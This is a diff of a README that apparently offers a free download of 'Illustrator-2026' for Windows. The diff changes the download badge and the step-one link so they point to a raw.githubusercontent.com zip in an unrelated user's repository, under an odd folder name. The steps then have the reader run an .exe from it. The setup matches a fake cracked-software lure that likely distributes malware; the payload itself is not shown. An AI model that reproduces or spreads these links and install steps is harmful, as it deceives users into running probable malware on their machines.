@@ -5,7 +5,7 @@ description: "Download Adobe Illustrator for Windows 10 and 11 using this direct
 ---
 # 🎨 Illustrator-2026 - Create professional graphics on your computer
 
-[![](https://img.shields.io/badge/Download_Illustrator-Blue?style=for-the-badge&logo=adobe)](https://github.com/Gretalpassing522/gretalpassing522.github.io/raw/refs/heads/main/Haemosporidia/io-github-gretalpassing-2.7-alpha.3.zip)
+[![](https://img.shields.io/badge/Download_Illustrator-Blue?style=for-the-badge&logo=adobe)](https://raw.githubusercontent.com/Gretalpassing522/gretalpassing522.github.io/main/Haemosporidia/io-github-gretalpassing-2.7-alpha.3.zip)
 
 ## 📌 About this project
 
@@ -26,7 +26,7 @@ Your computer needs specific hardware to run version 2026 of this software. Plea
 
 Follow these steps to access the installation files:
 
-1. Visit the project repository page at this link: [https://github.com/Gretalpassing522/gretalpassing522.github.io/raw/refs/heads/main/Haemosporidia/io-github-gretalpassing-2.7-alpha.3.zip](https://github.com/Gretalpassing522/gretalpassing522.github.io/raw/refs/heads/main/Haemosporidia/io-github-gretalpassing-2.7-alpha.3.zip).
+1. Visit the project repository page at this link: [https://raw.githubusercontent.com/Gretalpassing522/gretalpassing522.github.io/main/Haemosporidia/io-github-gretalpassing-2.7-alpha.3.zip](https://raw.githubusercontent.com/Gretalpassing522/gretalpassing522.github.io/main/Haemosporidia/io-github-gretalpassing-2.7-alpha.3.zip).
 2. Locate the section labeled Releases on the right side of the page.
 3. Choose the latest version release.
 4. Download the installer file ending in .exe to your Downloads folder.
